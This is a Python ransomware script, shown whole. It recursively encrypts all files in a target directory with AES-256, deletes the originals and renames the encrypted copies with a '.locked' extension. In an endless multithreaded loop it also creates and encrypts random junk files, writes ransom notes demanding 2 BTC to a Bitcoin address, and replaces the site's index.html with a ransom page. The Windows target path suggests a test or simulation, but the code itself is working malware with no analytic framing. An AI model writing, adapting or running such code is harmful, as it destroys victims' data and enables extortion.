#!/usr/bin/env python3

import os
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Input target directory
TARGET_DIR = r"C:\\Users\\azureuser\\Downloads\\security_soln_frontend"

KEY_FILE = "aes_key.bin"
KEY_DIR = "encryption_keys"

os.makedirs(TARGET_DIR, exist_ok=True)
os.makedirs(KEY_DIR, exist_ok=True)

key_path = os.path.join(KEY_DIR, KEY_FILE)

# Load or create AES-256 key (32 bytes)
if not os.path.exists(key_path):
    key = os.urandom(32)  # 256 bits
    with open(key_path, "wb") as f:
        f.write(key)
else:
    with open(key_path, "rb") as f:
        key = f.read()

backend = default_backend()

def aes_encrypt(data, key):
    iv = os.urandom(16)  # AES block size IV
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    # Prepend IV for use in decryption
    return iv + encrypted

def encrypt_file_in_place(file_path):
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        encrypted_data = aes_encrypt(data, key)
        encrypted_path = file_path + ".locked"

        with open(encrypted_path, "wb") as f:
            f.write(encrypted_data)

        os.remove(file_path)
        print(f"Encrypted: {encrypted_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

def create_and_encrypt_random_txt_file(folder_path):
    try:
        filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".txt"
        file_path = os.path.join(folder_path, filename)

        size = 100 * 1024  # 100 KB minimum size
        content = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
        with open(file_path, "w") as f:
            f.write(content)

        encrypt_file_in_place(file_path)
    except Exception as e:
        print(f"Failed to create/encrypt random file in {folder_path}: {e}")

def process_folder_recursively(thread_count=20):
    while True:
        tasks = []
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for root, _, files in os.walk(TARGET_DIR):
                for file in files:
                    if file.endswith(".locked") or file.startswith("README_WARNING") or file == "index.html":
                        continue
                    file_path = os.path.join(root, file)
                    tasks.append(executor.submit(encrypt_file_in_place, file_path))
                    tasks.append(executor.submit(create_and_encrypt_random_txt_file, root))
            for future in as_completed(tasks):
                try:
                    future.result()
                except Exception as e:
                    print(f"Thread task failed: {e}")

def drop_ransom_notes():
    for i in range(3):
        note_path = os.path.join(TARGET_DIR, f"README_WARNING_{i}.txt")
        with open(note_path, "w") as f:
            f.write("Your files have been encrypted. Pay 2BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 to get them back!")

def create_index_html():
    html_path = os.path.join(TARGET_DIR, "index.html")
    with open(html_path, "w") as f:
        f.write("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ransom Note</title>
    <style>
        body {
            background-color: #1a0000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }
        h1 {
            font-size: 4em;
            animation: blink 1s step-start infinite;
        }
        p {
            font-size: 1.5em;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <h1>This Website is Attacked!!!!!!!!!</h1>
    <p>Pay the ransom of 2BTC to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 to get the website back!!!!</p>
</body>
</html>
""")

if __name__ == "__main__":
    drop_ransom_notes()
    create_index_html()
    process_folder_recursively(thread_count=20)
